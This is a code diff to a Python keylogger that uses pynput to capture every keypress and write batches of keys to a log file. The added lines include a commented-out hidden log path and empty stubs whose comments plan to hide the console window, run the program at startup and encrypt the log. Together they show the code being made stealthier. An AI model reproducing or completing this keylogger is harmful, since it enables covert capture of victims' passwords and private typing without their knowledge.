@@ -1,9 +1,12 @@
 import pynput
 import sys
 
+from pathlib import Path
 from pynput.keyboard import Key, Listener
 
 
+#TODO: permission denied, diferent folder?
+#filepath = Path("C:/.log.txt")
 count = 0
 keys = []
 caps = False
@@ -15,7 +18,8 @@ def on_press(key):
     count += 1
     keys.append(key)
 
-    if count >= 5:#amount of chars to be writen
+    #amount of chars to be writen
+    if count >= 5:
         count = 0
         write_file(keys)
         keys = []
@@ -64,6 +68,16 @@ def write_file(keys):
                 else:
                     f.write(str(key).replace("'", '').capitalize())
 
+
+#TODO: this close console, exes on startup and shows a console, if key is right no keylgr needed in session
+def closecons():
+    return
+
+#TODO: Maybe add this
+def crypt():
+    return
+def decrypt():
+    return
 
 #Main loop calls functions
 with Listener(on_press = on_press, on_release = on_release) as listener:
